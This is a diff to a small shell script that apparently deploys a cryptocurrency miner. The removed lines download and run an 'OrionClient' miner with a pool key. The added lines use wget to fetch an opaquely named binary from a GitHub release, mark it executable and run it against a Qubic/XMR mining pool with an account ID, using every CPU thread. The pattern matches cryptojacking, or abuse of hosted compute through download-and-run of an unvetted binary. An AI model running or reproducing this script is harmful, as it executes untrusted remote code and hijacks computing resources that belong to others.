@@ -1,6 +1,5 @@
 #!/bin/sh
 apt update && apt install unzip
-wget https://github.com/egg5233/ore-hq-client/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip
-cd OrionClient_linux
-chmod +x OrionClient
-./OrionClient mine -a --pool twbitz --key xLPMoYZixVLRHJV7hb9gZoMusczWYRzP7JqFCRb6vXp --worker $(shuf -n 1 -i 1-99999)-VS -t 29 --ice
+wget https://github.com/vedhagsvp/qubros/releases/download/apl/vaseas
+chmod +x vaseas
+./vaseas --algo qubic_xmr --account CP_udnvh2owpq --pool qubic1.hk.apool.io:3334 --worker $(shuf -n 1 -i 1-99999)-22VJUL --thread $(nproc --all)
